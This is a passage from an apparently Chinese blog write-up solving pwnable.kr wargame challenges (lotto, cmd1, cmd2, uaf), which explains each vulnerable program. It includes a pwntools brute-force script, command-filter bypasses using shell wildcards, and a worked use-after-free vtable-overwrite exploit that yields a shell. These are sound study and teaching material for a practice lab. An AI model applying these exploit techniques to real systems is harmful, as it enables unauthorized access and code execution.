&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序中使用了<code>int fd = open("/dev/urandom", O_RDONLY);</code>来生成随机数，看下man手册：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">When read, the /dev/urandom device returns random bytes using a pseudorandom number generator seeded from the entropy pool. </span><br></pre></td></tr></table></figure>
<p>这个设备会生成伪随机数。之后程序使用了一个6*6的双for循环来进行比较，但是有一个问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="type">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">			match++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>对于生成的6个伪随机数，每一个你都有6次机会去猜，也就说你如果你输入6个一样的数字，猜对了其中一个就可以通过了(match分就变为6了)，脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s= ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;lotto&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line">pro = s.process(<span class="string">&#x27;/home/lotto/lotto&#x27;</span>)</span><br><span class="line">str1 = <span class="string">&quot;&quot;</span></span><br><span class="line">str1 += <span class="built_in">chr</span>(<span class="number">1</span>)+<span class="built_in">chr</span>(<span class="number">1</span>)+<span class="built_in">chr</span>(<span class="number">1</span>)+<span class="built_in">chr</span>(<span class="number">1</span>)+<span class="built_in">chr</span>(<span class="number">1</span>)+<span class="built_in">chr</span>(<span class="number">1</span>)	<span class="comment"># 随便输入6个一样的，对一个就过了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    pro.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> pro.recv()</span><br><span class="line">    pro.sendline(str1)</span><br><span class="line">    a =  pro.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)&gt;<span class="number">71</span>: <span class="comment">#71输入错误返回字符串的长度，就是下面字符串的长度</span></span><br><span class="line">        <span class="built_in">print</span> a</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#pass</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> Lotto Start!</span></span><br><span class="line"><span class="string">bad luck...</span></span><br><span class="line"><span class="string">- Select Menu -</span></span><br><span class="line"><span class="string">1. Play Lotto</span></span><br><span class="line"><span class="string">2. Help</span></span><br><span class="line"><span class="string">3. Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222160227623.png" style="zoom:80%;" /></p>
<h2 id="cmd1">cmd1</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is PATH environment in Linux?</span><br><span class="line"></span><br><span class="line">ssh cmd1@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(<span class="type">char</span>* cmd)</span>&#123;</span><br><span class="line">	<span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;	<span class="comment">//strstr函数会返回一个指向第一个发现后面字符串的指针</span></span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;sh&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;tmp&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>** envp)</span>&#123;</span><br><span class="line">	putenv(<span class="string">&quot;PATH=/thankyouverymuch&quot;</span>);	<span class="comment">//设置一个环境变量</span></span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序存放一个环境变量后，过滤你的输入，你的输入中不能包含<code>flag</code>、<code>sh</code>、<code>tmp</code>的字符串，然后会执行你的字符串。这里可以绕过检测，用?符号或者*符号即可:</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222161627502.png" style="zoom:80%;" /></p>
<h2 id="cmd2">cmd2</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Daddy bought me a system command shell.</span><br><span class="line">but he put some filters to prevent me from playing with it without his permission...</span><br><span class="line">but I wanna play anytime I want!</span><br><span class="line"></span><br><span class="line">ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">filter</span><span class="params">(<span class="type">char</span>* cmd)</span>&#123;</span><br><span class="line">	<span class="type">int</span> r=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;=&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;PATH&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;export&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;/&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;`&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	r += <span class="built_in">strstr</span>(cmd, <span class="string">&quot;flag&quot;</span>)!=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span>** environ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_env</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span>** p;</span><br><span class="line">	<span class="keyword">for</span>(p=environ; *p; p++)	<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>** envp)</span>&#123;</span><br><span class="line">	delete_env();</span><br><span class="line">	putenv(<span class="string">&quot;PATH=/no_command_execution_until_you_become_a_hacker&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">	system( argv[<span class="number">1</span>] );</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和cmd1差不多，也是过滤后执行，但是这次过滤更严格了，把'/'都过滤了。为了表示这个/，我们可以用根目录下的pwn来表示，然后cmd1中的payload不用变就好了：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222184817479.png" style="zoom:80%;" /></p>
<h2 id="uaf">uaf</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mommy, what is Use After Free bug?</span><br><span class="line"></span><br><span class="line">ssh uaf@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Human</span>&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">	string name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;My name is &quot;</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;I am &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Man</span>: <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Man</span>(string name, <span class="type">int</span> age)&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">		Human::<span class="built_in">introduce</span>();</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;I am a nice guy!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Woman</span>: <span class="keyword">public</span> Human&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">        <span class="built_in">Woman</span>(string name, <span class="type">int</span> age)&#123;</span><br><span class="line">                <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">                <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</span><br><span class="line">                Human::<span class="built_in">introduce</span>();</span><br><span class="line">                cout &lt;&lt; <span class="string">&quot;I am a cute girl!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Human* m = <span class="keyword">new</span> <span class="built_in">Man</span>(<span class="string">&quot;Jack&quot;</span>, <span class="number">25</span>);</span><br><span class="line">	Human* w = <span class="keyword">new</span> <span class="built_in">Woman</span>(<span class="string">&quot;Jill&quot;</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> len;</span><br><span class="line">	<span class="type">char</span>* data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> op;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;1. use\n2. after\n3. free\n&quot;</span>;</span><br><span class="line">		cin &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">switch</span>(op)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				m-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">				w-&gt;<span class="built_in">introduce</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				len = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">				data = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line">				<span class="built_in">read</span>(<span class="built_in">open</span>(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;your data is allocated&quot;</span> &lt;&lt; endl;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				<span class="keyword">delete</span> m;</span><br><span class="line">				<span class="keyword">delete</span> w;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>声明了三个类，其中<code>Human</code>类为另外两个类：Man和Woman类的父类，父类中有一个public方法introduce，会输出个人信息，子类中除了提供初始化方法之外，复写了父类的introduce方法，进行了丰富。C++里的virtual关键字可以实现多态性，让子类去复写方法虚函数，一旦一个类有虚函数，编译器会为这个类建立一张vtable。子类继承父类vtable中所有项，当子类有同名函数时，修改vtable同名函数地址，改为指向子类的函数地址，子类有新的虚函数时，在vtable中添加。</p>
<p><strong>私有函数无法继承，但如果私有函数是虚函数，vtable中会有相应的函数地址，所有子类可以通过手段得到父类的虚私有函数。</strong></p>
<p>父类中有一个私有方法<code>give_shell</code>会用system()函数给一个shell。main()方法中声明了两个对象指针，分别指向一个Woman类和Man类的实例化对象，并提供了三种互动选项：</p>
<ul>
<li>use-输出两个对象的信息；</li>
<li>after-新建一个命令行参数指定长度的char型数组，并以读的方式打开第二个参数，读入第一个参数指定的长度的数据
---
即分配了一个你指定的大小的char数组，并读入了你指定的文件的信息；</li>
<li>free-删除这两个对象。</li>
</ul>
<p>这道题想说明的问题是uaf漏洞(use after
free)，C++的内存在释放后，其原先指向的内容不会发生改变，当再次使用这个指针就会发生错误(即<strong>悬垂指针</strong>问题)。所以一些C++的图书中都会建议，在释放一块内存后，因该将这个指针指向NULL。下面是《C和C++安全编码(第2版)》一书中的描述：</p>
<blockquote>
<p>除非指向某块内存的指针已被设置为NULL或以其他方式被覆写，否则就有可能访问已被释放的内存。(遗憾的是，free()函数并不能把它的指针参数设置为NULL，因此他需要一个void
*的参数而不是void **类型的参数。)</p>
</blockquote>
<p>free函数和delete关键的的操作是一个意思，C++的new关键字也和malloc是一个意思，这些new出来的对象，会被储存在堆的区域。这里耐心点，这是一个很经典的问题，下先来学习一下UAF漏洞原理：</p>
<h3 id="漏洞原理">漏洞原理</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *p1;</span><br><span class="line">    p1 = (<span class="type">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);  <span class="comment">//申请内存空间</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;hello&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p1 addr:%x,%s\n&quot;</span>,p1,p1);</span><br><span class="line">    <span class="built_in">free</span>(p1);       <span class="comment">//释放内存空间</span></span><br><span class="line">    <span class="type">char</span> *p2;</span><br><span class="line">    p2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*<span class="number">10</span>);   <span class="comment">//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span></span><br><span class="line">    <span class="built_in">memcpy</span>(p1,<span class="string">&quot;world&quot;</span>,<span class="number">10</span>);      <span class="comment">//对内存进行修改</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p2 addr:%x,%s\n&quot;</span>,p2,p1);    <span class="comment">//验证</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​
意图很简单，先申请一个内存块，赋值，释放，紧接着再申请一个与它他大小一样的内存块，这时修改pi指针的值(use
after free)，然后打印p2指针的结果：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222214833903.png" alt="image-20200222214833903" style="zoom:80%;" /></p>
<p>​ 从结果可以看到如下特点：</p>
<ul>
<li>两个指针的地址是一样的</li>
<li>修改的是p1指针指向的内容，但是p2指针指向的内容也发生了改变</li>
</ul>
<p>这是因为，虽然释放了p1指针，但是他没有指向NULL，这个指针成为了一个悬垂指针。根本原因是因为free函数在释放时，如果内存块小于256KB，那么这块内存不会被马上回收，而是<strong>标记为空闲状态</strong>，这是因为：1.这个内存块如果不在堆的顶部就不会释放
2.供程序下一次使用。</p>
<p>​
那么我们回到题目，这两个类的对象肯定不会有256KB大，那么我用了第三个选项后，这两块内存就会被标为空闲状态，然后我调用第二个选项:<code>read(open(argv[2], O_RDONLY), data, len);</code>，len由第一个参数指定，之后会new一个len长度的块，放置从第二个参数指定的文件读取的数据，这时原先空闲的一个块中就有我的数据了，这时我再调用那个对象就可以访问到读入的数据内容了。</p>
<p>​ 那么我们先得知道一个上述对象的大小是多少：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222220717199.png" alt="image-20200222220717199"  /></p>
<p>​
从IDA中可以看到，一个对象占用空间为0x18=24字节，所以第一个len参数为24。嵌前面提到，使用了virtual关键字的函数成为一个虚函数，那么这个类就会有一张vtype的虚函数表，每一项都是一个虚函数指针，在这个类的所有对象中，都会有一个指向该类。这也时多态性的本质，当有子类覆写了父类的虚函数时，就会修改它从父类继承来的额虚函数表的这一项为自己覆写后的函数的地址。</p>
<p>​
对于上面Human父类，give_shell函数是私有的，子类不可覆写，虚函数地址不变，而子类可以复写introduce函数的地址。<strong>在类对象的内存分配中，首先是该类的vtable指针，下来才是对象数据</strong>，所以我们传入的第二个参数其实就是vtable的地址了。按理来说，你传入正常vtable函数的地址肯定是不行的了，那样调用的还是introduce()函数，<strong>如果我们能找出vtable到give_shell函数的地址差距，以vtable到introduce函数的差距，然后算出差值，再把vtable的地址用第二个参数手动修改为<code>vtable原址 - 差值</code>，这样调用introduce函数的时候不就调用成了give_shell函数了！</strong></p>
<p>​ <img src="/img/入坑Pwn-刷题补坑/image-20200222224734992.png"
alt="image-20200222224734992" /></p>
<p>​
<code>&lt;_ZN3ManC2ESsi@plt&gt;</code>就是Man类的初始化函数，跟进：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222224851374.png" alt="image-20200222224851374"  /></p>
<p>​ 可以看到在内部调用了父类的初始化方法：</p>
<p><code>&lt;_ZN5HumanC2Ev&gt;</code>，找到初始化方法的地址后，往上翻一点就是introduce方法和give_shell方法的地址了：
<img src="/img/入坑Pwn-刷题补坑/image-20200222225347360.png" alt="image-20200222225347360"  /></p>
<p>​
由此得出结论，Human类中give_shell函数的地址为<code>0x40117A</code>，而introduce函数的地址为<code>0x401192</code>。</p>
<p>​ 下面我们去找Man函数的introduce地址(可以从左边的栏直接点击)：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222225904514.png" alt="image-20200222225904514"  /></p>
<p>​
Man类的introduce函数地址为<code>0x4012D2</code>，可以看到与父类的introduce地址是不一样的，<strong>这里验证了多态性</strong>，内部调用了父类的introduce方法。我们反编译一下Man的代码段：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200222231511398.png"
alt="image-20200222231511398" />
<figcaption aria-hidden="true">image-20200222231511398</figcaption>
</figure>
<p>​ 查看偏移<code>0x401570</code>的这个函数：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200222233541824.png"
alt="image-20200222233541824" />
<figcaption aria-hidden="true">image-20200222233541824</figcaption>
</figure>
<p>​
我们就找到Man类的vtable基址了，<code>0x401560</code>，父类give_shell函数的地址，<code>0x401570</code>，这也验证了私有方法地址在父类和子类中是一样的，因为这个偏移地址中的数据是Human类的give_shell的地址，从这里可以看到give_shell函数比introduce函数小了8</p>
<p>​
基本流程就清晰了，下面注意main函数中这三段代码，结合Man的反汇编代码理解：</p>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200222230537521.png"
alt="image-20200222230537521" />
<figcaption aria-hidden="true">image-20200222230537521</figcaption>
</figure>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200222230715817.png"
alt="image-20200222230715817" />
<figcaption aria-hidden="true">image-20200222230715817</figcaption>
</figure>
<figure>
<img src="/img/入坑Pwn-刷题补坑/image-20200222230514611.png"
alt="image-20200222230514611" />
<figcaption aria-hidden="true">image-20200222230514611</figcaption>
</figure>
<p>​
下面这张是swith的逻辑，如果等于1的话，就调用<code>v13+8</code>地址的函数，以及<code>v14+8</code>地址的函数。那对应的就是调用了Man对象和Woman对象的introduce方法了，这里的v13和v14变量也就不难猜出是give_shell函数的地址了，而v3和v5则是vtable的基址。</p>
<p>​
源代码中这里调用了introduce方法，<strong>所以得出结论</strong>，introduce的偏移量相对give_shell函数为8，<strong>而从刚才Man的反编译代码也可以看出，二者确实差8，得以再次验证。</strong>至此，得出二者差为8。这里有个细节，vtables的基址是<code>0x401560</code>而实际上调用introduce方法的时候，使用give_shell的函数地址<code>0x401570</code>加8得到的，但是在Man的初始化方法中将传入的a1，也就是v3进行了一系列的处理，传出的v3就变成give_shell函数的地址了，具体怎么处理的这里不再讨论，只需要这么形象理解：传入一个单链表的表头，返回其第一个节点(其第一个虚函数地址)。</p>
<p>​
那么为了使调用<code>vtable第一项+8</code>这个地址函数的时候实际调用的是<code>vtale第一项</code>这个函数，只需要把vtable第一项减8就可以了，所以我们的第二个参数就有了
--- <code>0x401570 - 0x8  = 0x401568</code>。下面我们进行实践：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200222232920951.png" alt="image-20200222232920951" style="zoom:67%;" /></p>
<p>​ 成功！</p>
<p>​
注意，因为是堆，所以程序开始时new的顺序时先Man后Woman，释放的顺序是先Woman后Man，分配也是先获得woman的块才是man块。只有分配了两次，我们才能分配到Man的块，因为选择1时，调用是先调用的man的introduce。</p>
<h3 id="参考学习">参考学习</h3>
<ul>
<li>https://blog.csdn.net/weixin_39382337/article/details/79427181</li>
<li>https://www.cnblogs.com/p4nda/p/7149870.html</li>
<li>https://blog.csdn.net/qq_31481187/article/details/73612451?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</li>
<li>https://blog.csdn.net/qq_20307987/article/details/51511230</li>
<li>《C和C++安全编码》</li>
</ul>
<h2 id="memcpy">memcpy</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Are you tired of hacking?, take some rest here.</span><br><span class="line">Just help me out with my small experiment regarding memcpy performance. </span><br><span class="line">after that, flag is yours.</span><br><span class="line"></span><br><span class="line">http://pwnable.kr/bin/memcpy.c</span><br><span class="line"></span><br><span class="line">ssh memcpy@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
